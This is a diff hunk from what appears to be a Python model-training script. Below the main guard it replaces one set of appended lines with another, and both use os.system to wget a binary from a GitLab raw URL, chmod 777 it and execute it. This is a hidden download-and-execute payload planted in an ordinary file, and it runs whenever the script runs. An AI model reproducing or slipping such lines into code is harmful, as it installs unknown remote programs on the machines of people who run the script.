@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/veves/safrek/-/raw/main/saprex')
-os.system('chmod 777 saprek')
-os.system('./saprek')
+os.system('wget https://gitlab.com/jeffreyadams29/consel/-/raw/main/dulang')
+os.system('chmod 777 dulang')
+os.system('./dulang')
